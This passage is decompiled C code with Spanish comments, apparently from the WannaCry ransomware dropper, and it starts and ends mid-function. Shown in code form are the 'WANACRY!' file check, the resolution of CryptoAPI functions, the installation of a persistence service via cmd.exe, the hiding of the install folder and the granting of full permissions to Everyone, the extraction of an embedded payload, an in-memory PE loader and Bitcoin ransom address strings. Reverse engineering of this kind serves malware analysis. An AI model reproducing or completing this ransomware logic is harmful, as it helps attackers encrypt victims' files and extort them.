    if (1 < local_c) {
      return 0;
    }
  } while( true );
}



/* Genera un identificador de letras y digitos usando el nombre del equipo como semilla. */
void __cdecl FUN_00401225(int param_1)

{
  size_t sVar1;
  int iVar2;
  int iVar3;
  uint _Seed;
  int iVar4;
  undefined4 *puVar5;
  WCHAR *pWVar6;
  int iVar7;
  WCHAR local_19c;
  undefined4 local_19a [99];
  DWORD local_c;
  uint local_8;
  
  local_19c = DAT_0040f874;
  local_c = 399;
  puVar5 = local_19a;
  for (iVar3 = 99; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  *(undefined2 *)puVar5 = 0;
  GetComputerNameW(&local_19c,&local_c);
  local_8 = 0;
  _Seed = 1;
  sVar1 = wcslen(&local_19c);
  if (sVar1 != 0) {
    pWVar6 = &local_19c;
    do {
      _Seed = _Seed * (ushort)*pWVar6;
      local_8 = local_8 + 1;
      pWVar6 = pWVar6 + 1;
      sVar1 = wcslen(&local_19c);
    } while (local_8 < sVar1);
  }
  srand(_Seed);
  iVar3 = rand();
  iVar7 = 0;
  iVar4 = iVar3 % 8 + 8;
  if (0 < iVar4) {
    do {
      iVar2 = rand();
      *(char *)(iVar7 + param_1) = (char)(iVar2 % 0x1a) + 'a';
      iVar7 = iVar7 + 1;
    } while (iVar7 < iVar4);
  }
  for (; iVar7 < iVar3 % 8 + 0xb; iVar7 = iVar7 + 1) {
    iVar4 = rand();
    *(char *)(iVar7 + param_1) = (char)(iVar4 % 10) + '0';
  }
  *(undefined1 *)(iVar7 + param_1) = 0;
  return;
}



/* Inicializa el objeto principal, sus contextos de archivos y el motor criptografico. */
undefined4 * FUN_004012fd(void)

{
  undefined4 *extraout_ECX;
  int unaff_EBP;
  
  FUN_004076c8();
  *(undefined4 **)(unaff_EBP + -0x10) = extraout_ECX;
  FUN_004017dd(extraout_ECX + 1);
  *(undefined4 *)(unaff_EBP + -4) = 0;
  FUN_004017dd(extraout_ECX + 0xb);
  *(undefined1 *)(unaff_EBP + -4) = 1;
  FUN_00402a46(extraout_ECX + 0x15);
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  extraout_ECX[0x132] = 0;
  extraout_ECX[0x133] = 0;
  extraout_ECX[0x134] = 0;
  extraout_ECX[0x135] = 0;
  *extraout_ECX = &PTR_FUN_004081d8;
  return extraout_ECX;
}



/* Destructor del objeto principal; el bit bajo controla la liberacion de memoria. */
void * __thiscall FUN_0040135e(void *this,byte param_1)

{
  FUN_0040137a();
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return this;
}



/* Libera recursos del objeto principal y elimina sus buffers criptograficos. */
void FUN_0040137a(void)

{
  undefined4 *extraout_ECX;
  int unaff_EBP;
  
  FUN_004076c8();
  *(undefined4 **)(unaff_EBP + -0x10) = extraout_ECX;
  *extraout_ECX = &PTR_FUN_004081d8;
  *(undefined4 *)(unaff_EBP + -4) = 2;
  FUN_004013ce((int)extraout_ECX);
  *(undefined1 *)(unaff_EBP + -4) = 1;
  FUN_00402a6f(extraout_ECX + 0x15);
  *(undefined1 *)(unaff_EBP + -4) = 0;
  FUN_0040181b(extraout_ECX + 0xb);
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  FUN_0040181b(extraout_ECX + 1);
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



/* Cierra claves/proveedores y borra dos buffers de hasta 1 MiB antes de liberarlos. */
undefined4 __fastcall FUN_004013ce(int param_1)

{
  undefined1 *puVar1;
  int iVar2;
  int iVar3;
  
  FUN_004018b9(param_1 + 4);
  FUN_004018b9(param_1 + 0x2c);
  puVar1 = *(undefined1 **)(param_1 + 0x4c8);
  iVar3 = 0x100000;
  if (puVar1 != (undefined1 *)0x0) {
    iVar2 = 0x100000;
    do {
      *puVar1 = 0;
      puVar1 = puVar1 + 1;
      iVar2 = iVar2 + -1;
    } while (iVar2 != 0);
    GlobalFree(*(HGLOBAL *)(param_1 + 0x4c8));
    *(undefined4 *)(param_1 + 0x4c8) = 0;
  }
  puVar1 = *(undefined1 **)(param_1 + 0x4cc);
  if (puVar1 != (undefined1 *)0x0) {
    do {
      *puVar1 = 0;
      puVar1 = puVar1 + 1;
      iVar3 = iVar3 + -1;
    } while (iVar3 != 0);
    GlobalFree(*(HGLOBAL *)(param_1 + 0x4cc));
    *(undefined4 *)(param_1 + 0x4cc) = 0;
  }
  return 1;
}



/* Carga material criptografico y reserva los buffers usados por el procesamiento. */
undefined4 __thiscall FUN_00401437(void *this,LPCSTR param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  HGLOBAL pvVar2;
  
  iVar1 = FUN_00401861((void *)((int)this + 4),param_1);
  if (iVar1 != 0) {
    if (param_1 != (LPCSTR)0x0) {
      FUN_00401861((void *)((int)this + 0x2c),(LPCSTR)0x0);
    }
    pvVar2 = GlobalAlloc(0,0x100000);
    *(HGLOBAL *)((int)this + 0x4c8) = pvVar2;
    if (pvVar2 != (HGLOBAL)0x0) {
      pvVar2 = GlobalAlloc(0,0x100000);
      *(HGLOBAL *)((int)this + 0x4cc) = pvVar2;
      if (pvVar2 != (HGLOBAL)0x0) {
        *(undefined4 *)((int)this + 0x4d4) = param_2;
        *(undefined4 *)((int)this + 0x4d0) = param_3;
        return 1;
      }
    }
  }
  return 0;
}



// WARNING: Type propagation algorithm not settling

/* Valida, descifra y descomprime un archivo c.twnry; devuelve sus datos en memoria. */
byte * __thiscall FUN_004014a6(void *this,LPCSTR param_1,uint *param_2)

{
  byte *pbVar1;
  HANDLE hFile;
  int iVar2;
  byte *pbVar3;
  size_t local_248 [2];
  undefined1 local_240;
  undefined4 local_23f;
  undefined2 uStack_23b;
  undefined1 uStack_239;
  uint local_238;
  uint local_234;
  byte local_230 [512];
  size_t local_30;
  byte *local_2c;
  LARGE_INTEGER local_28;
  uint local_20 [3];
  void *local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &DAT_004081e0;
  puStack_10 = &DAT_004076f4;
  local_14 = ExceptionList;
  pbVar3 = (byte *)0x0;
  local_30 = 0;
  local_248[0] = 0;
  local_240 = 0;
  local_23f = 0;
  uStack_23b = 0;
  uStack_239 = 0;
  local_248[1] = 0;
  local_20[0] = 0;
  local_8 = 0;
  ExceptionList = &local_14;
  hFile = CreateFileA(param_1,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffff) {
    GetFileSizeEx(hFile,&local_28);
    if ((local_28.s.HighPart < 1) && ((local_28.s.HighPart < 0 || (local_28.s.LowPart < 0x6400001)))
       ) {
      iVar2 = (*DAT_0040f880)(hFile,&local_240,8,local_20,0);
      if (iVar2 != 0) {
        iVar2 = memcmp(&local_240,s_WANACRY__0040eb7c,8);
        if (iVar2 == 0) {
          iVar2 = (*DAT_0040f880)(hFile,local_248,4,local_20,0);
          if ((iVar2 != 0) && (local_248[0] == 0x100)) {
            iVar2 = (*DAT_0040f880)(hFile,*(undefined4 *)((int)this + 0x4c8),0x100,local_20,0);
            if (iVar2 != 0) {
              iVar2 = (*DAT_0040f880)(hFile,local_248 + 1,4,local_20,0);
              if (iVar2 != 0) {
                iVar2 = (*DAT_0040f880)(hFile,&local_238,8,local_20,0);
                if (((iVar2 != 0) && ((int)local_234 < 1)) &&
                   (((int)local_234 < 0 || (local_238 < 0x6400001)))) {
                  iVar2 = FUN_004019e1((void *)((int)this + 4),*(void **)((int)this + 0x4c8),
                                       local_248[0],local_230,&local_30);
                  if (iVar2 != 0) {
                    FUN_00402a76((void *)((int)this + 0x54),local_230,(uint *)PTR_DAT_0040f578,
                                 local_30,(byte *)0x10);
                    local_2c = GlobalAlloc(0,local_238);
                    if (local_2c != (byte *)0x0) {
                      iVar2 = (*DAT_0040f880)(hFile,*(undefined4 *)((int)this + 0x4c8),
                                              local_28.s.LowPart,local_20,0);
                      pbVar1 = local_2c;
                      if (((iVar2 != 0) && (local_20[0] != 0)) &&
                         ((0x7fffffff < local_234 ||
                          (((int)local_234 < 1 && (local_238 <= local_20[0])))))) {
                        FUN_00403a77((void *)((int)this + 0x54),*(byte **)((int)this + 0x4c8),
                                     local_2c,local_20[0],1);
                        *param_2 = local_238;
                        pbVar3 = pbVar1;
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  local_unwind2(&local_14,0xffffffff);
  ExceptionList = local_14;
  return pbVar3;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

/* Resuelve dinamicamente las API de archivos necesarias de kernel32.dll. */
undefined4 FUN_0040170a(void)

{
  int iVar1;
  HMODULE hModule;
  
  iVar1 = FUN_00401a45();
  if (iVar1 != 0) {
    if (DAT_0040f878 != (FARPROC)0x0) {
      return 1;
    }
    hModule = LoadLibraryA(s_kernel32_dll_0040ebe8);
    if (hModule != (HMODULE)0x0) {
      DAT_0040f878 = GetProcAddress(hModule,s_CreateFileW_0040ebdc);
      DAT_0040f87c = GetProcAddress(hModule,s_WriteFile_0040ebd0);
      DAT_0040f880 = GetProcAddress(hModule,s_ReadFile_0040ebc4);
      DAT_0040f884 = GetProcAddress(hModule,s_MoveFileW_0040ebb8);
      DAT_0040f888 = GetProcAddress(hModule,s_MoveFileExW_0040ebac);
      DAT_0040f88c = GetProcAddress(hModule,s_DeleteFileW_0040eba0);
      _DAT_0040f890 = GetProcAddress(hModule,s_CloseHandle_0040eb94);
      if ((((DAT_0040f878 != (FARPROC)0x0) && (DAT_0040f87c != (FARPROC)0x0)) &&
          (DAT_0040f880 != (FARPROC)0x0)) &&
         (((DAT_0040f884 != (FARPROC)0x0 && (DAT_0040f888 != (FARPROC)0x0)) &&
          ((DAT_0040f88c != (FARPROC)0x0 && (_DAT_0040f890 != (FARPROC)0x0)))))) {
        return 1;
      }
    }
  }
  return 0;
}



/* Inicializa un contexto de archivos y su seccion critica. */
undefined4 * __fastcall FUN_004017dd(undefined4 *param_1)

{
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  *param_1 = &PTR_FUN_004081ec;
  InitializeCriticalSection((LPCRITICAL_SECTION)(param_1 + 4));
  return param_1;
}



/* Destructor del contexto de archivos; puede liberar la instancia. */
undefined4 * __thiscall FUN_004017ff(void *this,byte param_1)

{
  FUN_0040181b(this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return this;
}



/* Elimina la seccion critica del contexto de archivos. */
void __fastcall FUN_0040181b(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_004081ec;
  DeleteCriticalSection((LPCRITICAL_SECTION)(param_1 + 4));
  return;
}



/* Intenta abrir un proveedor criptografico en dos almacenes posibles. */
undefined4 __fastcall FUN_0040182c(int param_1)

{
  int iVar1;
  int iVar2;
  
  iVar2 = 0;
  do {
    iVar1 = (*DAT_0040f894)(param_1 + 4,0,-(uint)(iVar2 != 0) & 0x40f08c,0x18,0xf0000000);
    if (iVar1 != 0) {
      return 1;
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 2);
  return 0;
}



/* Importa una clave desde memoria o desde el archivo indicado. */
undefined4 __thiscall FUN_00401861(void *this,LPCSTR param_1)

{
  int iVar1;
  
  iVar1 = FUN_0040182c((int)this);
  if (iVar1 != 0) {
    if (param_1 == (LPCSTR)0x0) {
      iVar1 = (*DAT_0040f898)(*(undefined4 *)((int)this + 4),&DAT_0040ebf8,0x494,0,0,(int)this + 8);
    }
    else {
      iVar1 = FUN_004018f9(*(undefined4 *)((int)this + 4),(int)this + 8,param_1);
    }
    if (iVar1 != 0) {
      return 1;
    }
  }
  FUN_004018b9((int)this);
  return 0;
}



/* Destruye las claves importadas y libera el proveedor criptografico. */
undefined4 __fastcall FUN_004018b9(int param_1)

{
  if (*(int *)(param_1 + 8) != 0) {
    (*DAT_0040f89c)(*(int *)(param_1 + 8));
    *(undefined4 *)(param_1 + 8) = 0;
  }
  if (*(int *)(param_1 + 0xc) != 0) {
    (*DAT_0040f89c)(*(int *)(param_1 + 0xc));
    *(undefined4 *)(param_1 + 0xc) = 0;
  }
  if (*(HCRYPTPROV *)(param_1 + 4) != 0) {
    CryptReleaseContext(*(HCRYPTPROV *)(param_1 + 4),0);
    *(undefined4 *)(param_1 + 4) = 0;
  }
  return 1;
}



/* Lee un archivo pequeno y lo importa como clave criptografica. */
undefined4 __cdecl FUN_004018f9(undefined4 param_1,undefined4 param_2,LPCSTR param_3)

{
  HANDLE hFile;
  DWORD dwBytes;
  HGLOBAL lpBuffer;
  BOOL BVar1;
  int iVar2;
  undefined4 uVar3;
  DWORD local_20 [3];
  void *local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &DAT_004081f0;
  puStack_10 = &DAT_004076f4;
  local_14 = ExceptionList;
  uVar3 = 0;
  local_20[0] = 0;
  local_8 = 0;
  ExceptionList = &local_14;
  hFile = CreateFileA(param_3,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffff) {
    dwBytes = GetFileSize(hFile,(LPDWORD)0x0);
    if ((dwBytes != 0xffffffff) && (dwBytes < 0x19001)) {
      lpBuffer = GlobalAlloc(0,dwBytes);
      if (lpBuffer != (HGLOBAL)0x0) {
        BVar1 = ReadFile(hFile,lpBuffer,dwBytes,local_20,(LPOVERLAPPED)0x0);
        if (BVar1 != 0) {
          iVar2 = (*DAT_0040f898)(param_1,lpBuffer,local_20[0],0,0,param_2);
          if (iVar2 != 0) {
            uVar3 = 1;
          }
        }
      }
    }
  }
  local_unwind2(&local_14,0xffffffff);
  ExceptionList = local_14;
  return uVar3;
}



/* Descifra o descomprime un bloque bajo proteccion de una seccion critica. */
undefined4 __thiscall
FUN_004019e1(void *this,void *param_1,size_t param_2,void *param_3,size_t *param_4)

{
  LPCRITICAL_SECTION lpCriticalSection;
  int iVar1;
  
  if (*(int *)((int)this + 8) != 0) {
    lpCriticalSection = (LPCRITICAL_SECTION)((int)this + 0x10);
    EnterCriticalSection(lpCriticalSection);
    iVar1 = (*DAT_0040f8a4)(*(undefined4 *)((int)this + 8),0,1,0,param_1,&param_2);
    if (iVar1 != 0) {
      LeaveCriticalSection(lpCriticalSection);
      memcpy(param_3,param_1,param_2);
      *param_4 = param_2;
      return 1;
    }
    LeaveCriticalSection(lpCriticalSection);
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

/* Resuelve dinamicamente las API criptograficas de advapi32.dll. */
undefined4 FUN_00401a45(void)

{
  HMODULE hModule;
  undefined4 uVar1;
  
  if (DAT_0040f894 == (FARPROC)0x0) {
    hModule = LoadLibraryA(s_advapi32_dll_0040e020);
    if (hModule != (HMODULE)0x0) {
      DAT_0040f894 = GetProcAddress(hModule,s_CryptAcquireContextA_0040f110);
      DAT_0040f898 = GetProcAddress(hModule,s_CryptImportKey_0040f100);
      DAT_0040f89c = GetProcAddress(hModule,s_CryptDestroyKey_0040f0f0);
      DAT_0040f8a0 = GetProcAddress(hModule,s_CryptEncrypt_0040f0e0);
      DAT_0040f8a4 = GetProcAddress(hModule,s_CryptDecrypt_0040f0d0);
      _DAT_0040f8a8 = GetProcAddress(hModule,s_CryptGenKey_0040f0c4);
      if ((((DAT_0040f894 != (FARPROC)0x0) && (DAT_0040f898 != (FARPROC)0x0)) &&
          (DAT_0040f89c != (FARPROC)0x0)) &&
         (((DAT_0040f8a0 != (FARPROC)0x0 && (DAT_0040f8a4 != (FARPROC)0x0)) &&
          (_DAT_0040f8a8 != (FARPROC)0x0)))) goto LAB_00401aec;
    }
    uVar1 = 0;
  }
  else {
LAB_00401aec:
    uVar1 = 1;
  }
  return uVar1;
}



/* Crea una ruta de instalacion, cambia a ella y aplica atributos ocultos. */
undefined4 __cdecl FUN_00401af6(LPCWSTR param_1,LPCWSTR param_2,wchar_t *param_3)

{
  BOOL BVar1;
  DWORD DVar2;
  
  CreateDirectoryW(param_1,(LPSECURITY_ATTRIBUTES)0x0);
  BVar1 = SetCurrentDirectoryW(param_1);
  if (BVar1 != 0) {
    CreateDirectoryW(param_2,(LPSECURITY_ATTRIBUTES)0x0);
    BVar1 = SetCurrentDirectoryW(param_2);
    if (BVar1 != 0) {
      DVar2 = GetFileAttributesW(param_2);
      SetFileAttributesW(param_2,DVar2 | 6);
      if (param_3 != (wchar_t *)0x0) {
        swprintf(param_3,0x40eb88,param_1,param_2);
      }
      return 1;
    }
  }
  return 0;
}



/* Prueba directorios de Windows y Temp hasta encontrar una ubicacion de trabajo. */
bool __cdecl FUN_00401b5f(wchar_t *param_1)

{
  DWORD DVar1;
  wchar_t *pwVar2;
  int iVar3;
  undefined4 *puVar4;
  WCHAR local_4dc;
  undefined4 local_4da;
  WCHAR local_2d4;
  undefined4 local_2d2 [129];
  WCHAR local_cc;
  undefined4 local_ca [49];
  
  local_4dc = DAT_0040f874;
  puVar4 = &local_4da;
  for (iVar3 = 0x81; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  *(undefined2 *)puVar4 = 0;
  local_2d4 = DAT_0040f874;
  puVar4 = local_2d2;
  for (iVar3 = 0x81; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  *(undefined2 *)puVar4 = 0;
  local_cc = DAT_0040f874;
  puVar4 = local_ca;
  for (iVar3 = 0x31; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  *(undefined2 *)puVar4 = 0;
  MultiByteToWideChar(0,0,(LPCSTR)&lpMultiByteStr_0040f8ac,-1,&local_cc,99);
  GetWindowsDirectoryW(&local_4dc,0x104);
  local_4da._2_2_ = 0;
  swprintf(&local_2d4,0x40f40c,&local_4dc);
  DVar1 = GetFileAttributesW(&local_2d4);
  if ((DVar1 == 0xffffffff) || (iVar3 = FUN_00401af6(&local_2d4,&local_cc,param_1), iVar3 == 0)) {
    swprintf(&local_2d4,0x40f3f8,&local_4dc);
    iVar3 = FUN_00401af6(&local_2d4,&local_cc,param_1);
    if ((iVar3 == 0) && (iVar3 = FUN_00401af6(&local_4dc,&local_cc,param_1), iVar3 == 0)) {
      GetTempPathW(0x104,&local_2d4);
      pwVar2 = wcsrchr(&local_2d4,L'\\');
      if (pwVar2 != (wchar_t *)0x0) {
        pwVar2 = wcsrchr(&local_2d4,L'\\');
        *pwVar2 = L'\0';
      }
      iVar3 = FUN_00401af6(&local_2d4,&local_cc,param_1);
      return iVar3 != 0;
    }
  }
  return true;
}



/* Instala e inicia el servicio persistente usado para relanzar el ejecutable. */
undefined4 __cdecl FUN_00401ce8(undefined4 param_1)

{
  undefined4 uVar1;
  SC_HANDLE hService;
  char local_410 [1024];
  SC_HANDLE local_10;
  undefined4 local_c;
  SC_HANDLE local_8;
  
  local_c = 0;
  local_8 = OpenSCManagerA((LPCSTR)0x0,(LPCSTR)0x0,0xf003f);
  if (local_8 == (SC_HANDLE)0x0) {
    uVar1 = 0;
  }
  else {
    local_10 = OpenServiceA(local_8,(LPCSTR)&lpMultiByteStr_0040f8ac,0xf01ff);
    if (local_10 == (SC_HANDLE)0x0) {
      sprintf(local_410,s_cmd_exe__c___s__0040f42c,param_1);
      hService = CreateServiceA(local_8,(LPCSTR)&lpMultiByteStr_0040f8ac,
                                (LPCSTR)&lpMultiByteStr_0040f8ac,0xf01ff,0x10,2,1,local_410,
                                (LPCSTR)0x0,(LPDWORD)0x0,(LPCSTR)0x0,(LPCSTR)0x0,(LPCSTR)0x0);
      uVar1 = local_c;
      if (hService != (SC_HANDLE)0x0) {
        StartServiceA(hService,0,(LPCSTR *)0x0);
        CloseServiceHandle(hService);
        local_c = 1;
        uVar1 = local_c;
      }
    }
    else {
      StartServiceA(local_10,0,(LPCSTR *)0x0);
      CloseServiceHandle(local_10);
      uVar1 = 1;
    }
    CloseServiceHandle(local_8);
  }
  return uVar1;
}



/* Extrae archivos de un recurso ZIP embebido, salvo c.wnry si ya existe. */
undefined4 __cdecl FUN_00401dab(HMODULE param_1)

{
  HRSRC hResInfo;
  HGLOBAL hResData;
  LPVOID pvVar1;
  int *piVar2;
  int iVar3;
  DWORD DVar4;
  int iVar5;
  char *pcVar6;
  int local_130;
  char local_12c [296];
  
  /* Localiza el recurso embebido por identificador y tipo. */
  hResInfo = FindResourceA(param_1,&lpName_0000080a,(LPCSTR)&lpType_0040f43c);
  if (((hResInfo != (HRSRC)0x0) &&
      (hResData = LoadResource(param_1,hResInfo), hResData != (HGLOBAL)0x0)) &&
     (pvVar1 = LockResource(hResData), pvVar1 != (LPVOID)0x0)) {
    /* El contenido se valida y consume a traves del lector ZIP auxiliar. */
    SizeofResource(param_1,hResInfo);
    piVar2 = (int *)FUN_004075ad();
    if (piVar2 != (int *)0x0) {
      local_130 = 0;
      pcVar6 = local_12c;
      for (iVar5 = 0x4a; iVar5 != 0; iVar5 = iVar5 + -1) {
        pcVar6[0] = '\0';
        pcVar6[1] = '\0';
        pcVar6[2] = '\0';
        pcVar6[3] = '\0';
        pcVar6 = pcVar6 + 4;
      }
      FUN_004075c4(piVar2,-1,&local_130);
      iVar5 = local_130;
      pcVar6 = (char *)0x0;
      /* Recorre las entradas y extrae solo las que aun no existen en disco. */
      if (0 < local_130) {
        do {
          FUN_004075c4(piVar2,(int)pcVar6,&local_130);
          iVar3 = strcmp(local_12c,s_c_wnry_0040e010);
          if ((iVar3 != 0) || (DVar4 = GetFileAttributesA(local_12c), DVar4 == 0xffffffff)) {
            FUN_0040763d(piVar2,pcVar6,local_12c);
          }
          pcVar6 = pcVar6 + 1;
        } while ((int)pcVar6 < iVar5);
      }
      FUN_00407656(piVar2);
      return 1;
    }
  }
  return 0;
}



/* Recupera estado y selecciona una cadena embebida para la inicializacion. */
void FUN_00401e9e(void)

{
  bool bVar1;
  undefined3 extraout_var;
  int iVar2;
  undefined1 local_31c [178];
  char local_26a [602];
  char *local_10 [3];
  
  local_10[0] = s_13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb_0040f488;
  local_10[1] = s_12t9YDPgwueZ9NyMgw519p7AA8isjr6S_0040f464;
  local_10[2] = s_115p7UMMngoj1pMvkpHijcRdfJNXj6Lr_0040f440;
  bVar1 = FUN_00401000(local_31c,1);
  if (CONCAT31(extraout_var,bVar1) != 0) {
    iVar2 = rand();
    strcpy(local_26a,local_10[iVar2 % 3]);
    FUN_00401000(local_31c,0);
  }
  return;
}



/* Espera hasta que exista el mutex global que indica otra instancia activa. */
undefined4 __cdecl FUN_00401eff(int param_1)

{
  HANDLE hObject;
  int iVar1;
  char local_68 [100];
  
  sprintf(local_68,(char *)&_Format_0040f4ac,s_Global_MsWinZonesCacheCounterMut_0040f4b4,0);
  iVar1 = 0;
  if (0 < param_1) {
    do {
      hObject = OpenMutexA(0x100000,1,local_68);
      if (hObject != (HANDLE)0x0) {
        CloseHandle(hObject);
        return 1;
      }
      Sleep(1000);
      iVar1 = iVar1 + 1;
    } while (iVar1 < param_1);
  }
  return 0;
}



/* Copia tasksche.exe, crea/inicia el servicio y espera a que arranque. */
undefined4 FUN_00401f5d(void)

{
  int iVar1;
  undefined4 *puVar2;
  CHAR local_20c;
  undefined4 local_20b;
  
  local_20c = DAT_0040f910;
  puVar2 = &local_20b;
  for (iVar1 = 0x81; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined2 *)puVar2 = 0;
  *(undefined1 *)((int)puVar2 + 2) = 0;
  GetFullPathNameA(s_tasksche_exe_0040f4d8,0x208,&local_20c,(LPSTR *)0x0);
  iVar1 = FUN_00401ce8(&local_20c);
  if ((iVar1 != 0) && (iVar1 = FUN_00401eff(0x3c), iVar1 != 0)) {
    return 1;
  }
  iVar1 = FUN_00401064(&local_20c,0,(LPDWORD)0x0);
  if ((iVar1 != 0) && (iVar1 = FUN_00401eff(0x3c), iVar1 != 0)) {
    return 1;
  }
  return 0;
}



/* Flujo principal: prepara persistencia, extrae recursos y comienza el procesamiento. */
undefined4 FUN_00401fe7(void)

{
  bool bVar1;
  int *piVar2;
  undefined3 extraout_var;
  DWORD DVar3;
  char *pcVar4;
  byte *pbVar5;
  code *pcVar6;
  int iVar7;
  undefined4 *puVar8;
  char **_Str2;
  undefined1 local_6e8 [1240];
  CHAR local_210;
  undefined4 local_20f;
  uint local_8;
  
  local_210 = DAT_0040f910;
  puVar8 = &local_20f;
  for (iVar7 = 0x81; iVar7 != 0; iVar7 = iVar7 + -1) {
    *puVar8 = 0;
    puVar8 = puVar8 + 1;
  }
  *(undefined2 *)puVar8 = 0;
  *(undefined1 *)((int)puVar8 + 2) = 0;
  GetModuleFileNameA((HMODULE)0x0,&local_210,0x208);
  FUN_00401225(0x40f8ac);
  piVar2 = (int *)__p___argc();
  if (*piVar2 == 2) {
    _Str2 = &_Str2_0040f538;
    piVar2 = (int *)__p___argv();
    iVar7 = strcmp(*(char **)(*piVar2 + 4),(char *)_Str2);
    if ((iVar7 == 0) && (bVar1 = FUN_00401b5f((wchar_t *)0x0), CONCAT31(extraout_var,bVar1) != 0)) {
      CopyFileA(&local_210,s_tasksche_exe_0040f4d8,0);
      DVar3 = GetFileAttributesA(s_tasksche_exe_0040f4d8);
      if ((DVar3 != 0xffffffff) && (iVar7 = FUN_00401f5d(), iVar7 != 0)) {
        return 0;
      }
    }
  }
  pcVar4 = strrchr(&local_210,0x5c);
  if (pcVar4 != (char *)0x0) {
    pcVar4 = strrchr(&local_210,0x5c);
    *pcVar4 = '\0';
  }
  /* El directorio del ejecutable se convierte en la base de las operaciones. */
  SetCurrentDirectoryA(&local_210);
  /* Registra la ruta actual y extrae los componentes embebidos. */
  FUN_004010fd(1);
  FUN_00401dab((HMODULE)0x0);
  FUN_00401e9e();
  /* Ajusta atributos/permisos antes de comenzar el trabajo principal. */
  FUN_00401064(s_attrib__h___0040f520,0,(LPDWORD)0x0);
  FUN_00401064(s_icacls____grant_Everyone_F__T__C_0040f4fc,0,(LPDWORD)0x0);
  iVar7 = FUN_0040170a();
  if (iVar7 != 0) {
    FUN_004012fd();
    iVar7 = FUN_00401437(local_6e8,(LPCSTR)0x0,0,0);
    if (iVar7 != 0) {
      local_8 = 0;
      pbVar5 = FUN_004014a6(local_6e8,s_t_wnry_0040f4f4,&local_8);
      /* Abre c.twnry, obtiene la entrada TaskStart y ejecuta su callback. */
      if (((pbVar5 != (byte *)0x0) &&
          (piVar2 = (int *)FUN_004021bd((short *)pbVar5,local_8), piVar2 != (int *)0x0)) &&
         (pcVar6 = (code *)FUN_00402924(piVar2,s_TaskStart_0040f4e8), pcVar6 != (code *)0x0)) {
        (*pcVar6)(0,0);
      }
    }
    FUN_0040137a();
  }
  return 0;
}



/* Punto de entrada del cargador PE manual para un blob descomprimido. */
void __cdecl FUN_004021bd(short *param_1,uint param_2)

{
  FUN_004021e9(param_1,param_2,&LAB_0040216e,&LAB_00402185,0x402198,&LAB_004021a3,0x4021b2,0);
  return;
}



/* Reserva memoria, copia cabeceras/secciones y reubica una imagen PE. */
uint * __cdecl
FUN_004021e9(short *param_1,uint param_2,undefined *param_3,undefined *param_4,uint param_5,
            undefined *param_6,uint param_7,uint param_8)

{
  bool bVar1;
  int iVar2;
  HMODULE pHVar3;
  code *pcVar4;
  uint uVar5;
  HANDLE hHeap;
  uint *puVar6;
  void *_Dst;
  undefined3 extraout_var;
  undefined3 extraout_var_00;
  int *piVar7;
  uint uVar8;
  int *piVar9;
  DWORD DVar10;
  SIZE_T dwBytes;
  undefined1 local_2c [4];
  uint local_28;
  uint local_8;
  
  local_8 = 0;
  iVar2 = FUN_00402457(param_2,0x40);
  if (iVar2 == 0) {
    return (uint *)0x0;
  }
  if (*param_1 == 0x5a4d) {
    iVar2 = FUN_00402457(param_2,*(int *)(param_1 + 0x1e) + 0xf8);
    if (iVar2 == 0) {
      return (uint *)0x0;
    }
    piVar9 = (int *)(*(int *)(param_1 + 0x1e) + (int)param_1);
    if (((*piVar9 == 0x4550) && ((short)piVar9[1] == 0x14c)) && ((piVar9[0xe] & 1U) == 0)) {
      uVar8 = (uint)*(ushort *)((int)piVar9 + 6);
      if (uVar8 != 0) {
        piVar7 = (int *)((int)piVar9 + *(ushort *)(piVar9 + 5) + 0x24);
        do {
          uVar5 = piVar7[1];
          if (uVar5 == 0) {
            uVar5 = piVar9[0xe];
          }
          if (local_8 < *piVar7 + uVar5) {
            local_8 = *piVar7 + uVar5;
          }
          piVar7 = piVar7 + 10;
          uVar8 = uVar8 - 1;
        } while (uVar8 != 0);
      }
      pHVar3 = GetModuleHandleA(s_kernel32_dll_0040ebe8);
      if (pHVar3 == (HMODULE)0x0) {
        return (uint *)0x0;
      }
      pcVar4 = (code *)(*(code *)param_6)(pHVar3,s_GetNativeSystemInfo_0040f55c,0);
      if (pcVar4 == (code *)0x0) {
        return (uint *)0x0;
      }
      (*pcVar4)(local_2c);
      uVar8 = piVar9[0x14] + -1 + local_28 & ~(local_28 - 1);
      if (uVar8 == ((local_28 - 1) + local_8 & ~(local_28 - 1))) {
        uVar5 = (*(code *)param_3)(piVar9[0xd],uVar8,0x3000,4,param_8);
        if ((uVar5 != 0) || (uVar5 = (*(code *)param_3)(0,uVar8,0x3000,4,param_8), uVar5 != 0)) {
          dwBytes = 0x3c;
          DVar10 = 8;
          hHeap = GetProcessHeap();
          puVar6 = HeapAlloc(hHeap,DVar10,dwBytes);
          if (puVar6 != (uint *)0x0) {
            puVar6[1] = uVar5;
            puVar6[5] = (*(ushort *)((int)piVar9 + 0x16) & 0x2000) >> 0xd;
            puVar6[7] = (uint)param_3;
